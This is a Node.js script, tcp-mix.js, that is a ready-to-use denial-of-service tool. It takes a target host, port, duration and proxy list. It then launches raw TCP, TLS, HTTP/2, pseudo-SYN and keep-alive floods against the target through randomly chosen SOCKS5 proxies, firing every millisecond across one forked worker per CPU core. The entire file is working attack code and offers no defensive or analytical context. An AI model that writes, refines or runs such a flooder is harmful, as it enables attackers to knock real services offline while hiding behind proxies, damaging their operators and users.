const net = require('net');
const cluster = require('cluster');
const crypto = require('crypto');
const tls = require('tls');
const http2 = require('http2');
const fs = require('fs');
const SocksClient = require('socks').SocksClient;

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log('Usage: node tcp-mix.js <target> <port> <duration> <proxy_file>');
    process.exit(0);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const proxyFile = process.argv[5];

let PROXYLIST = [];
if (fs.existsSync(proxyFile)) {
    PROXYLIST = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(a => a.trim() && a.includes(':'));
}

const getRandomProxy = () => {
    if (PROXYLIST.length === 0) return null;
    const proxy = PROXYLIST[Math.floor(Math.random() * PROXYLIST.length)];
    const [host, port] = proxy.split(':');
    return { host, port: parseInt(port) };
};

const methods = [
    // Method 1: Raw TCP Flood through SOCKS5
    async () => {
        const proxy = getRandomProxy();
        if (!proxy) return;

        try {
            const { socket } = await SocksClient.createConnection({
                proxy: {
                    host: proxy.host,
                    port: proxy.port,
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: target,
                    port: port
                }
            });

            socket.write(crypto.randomBytes(1024));
            socket.write(crypto.randomBytes(1024));

            socket.on('error', () => {
                socket.destroy();
            });
        } catch (err) {}
    },

    // Method 2: TLS Flood through SOCKS5
    async () => {
        const proxy = getRandomProxy();
        if (!proxy) return;

        try {
            const { socket } = await SocksClient.createConnection({
                proxy: {
                    host: proxy.host,
                    port: proxy.port,
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: target,
                    port: port
                }
            });

            const tlsConnection = tls.connect({
                socket: socket,
                host: target,
                port: port,
                rejectUnauthorized: false,
                secure: false,
                servername: target
            });

            tlsConnection.on('connect', () => {
                tlsConnection.write(crypto.randomBytes(1024));
            });

            tlsConnection.on('error', () => {
                tlsConnection.destroy();
            });
        } catch (err) {}
    },

    // Method 3: HTTP2 PUSH_PROMISE Flood through SOCKS5
    async () => {
        const proxy = getRandomProxy();
        if (!proxy) return;

        try {
            const { socket } = await SocksClient.createConnection({
                proxy: {
                    host: proxy.host,
                    port: proxy.port,
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: target,
                    port: port
                }
            });

            const client = http2.connect(`https://${target}:${port}`, {
                createConnection: () => socket,
                rejectUnauthorized: false
            });

            const req = client.request({
                ':method': 'POST',
                ':path': '/',
                ':scheme': 'https',
                ':authority': target
            });

            req.on('response', () => {
                req.write(crypto.randomBytes(1024));
            });

            client.on('error', () => {
                client.destroy();
            });
        } catch (err) {}
    },

    // Method 4: TCP SYN Flood with Random Source through SOCKS5
    async () => {
        const proxy = getRandomProxy();
        if (!proxy) return;

        try {
            const { socket } = await SocksClient.createConnection({
                proxy: {
                    host: proxy.host,
                    port: proxy.port,
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: target,
                    port: port
                }
            });

            socket.write(Buffer.from('SYN' + crypto.randomBytes(10).toString('hex')));

            socket.on('error', () => {
                socket.destroy();
            });
        } catch (err) {}
    },

    // Method 5: TCP Keep-Alive Attack through SOCKS5
    async () => {
        const proxy = getRandomProxy();
        if (!proxy) return;

        try {
            const { socket } = await SocksClient.createConnection({
                proxy: {
                    host: proxy.host,
                    port: proxy.port,
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: target,
                    port: port
                }
            });

            socket.setKeepAlive(true, 1000);
            socket.write(crypto.randomBytes(1024));

            socket.on('error', () => {
                socket.destroy();
            });

            setTimeout(() => {
                socket.destroy();
            }, 10000);
        } catch (err) {}
    }
];

const flood = () => {
    if (PROXYLIST.length === 0) {
        console.log('No proxies loaded. Exiting...');
        process.exit(0);
    }

    setInterval(() => {
        const method = methods[Math.floor(Math.random() * methods.length)];
        method();
    }, 1);
};

if (cluster.isMaster) {
    const numCPUs = require('os').cpus().length;
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, duration * 1000);
} else {
    flood();
} 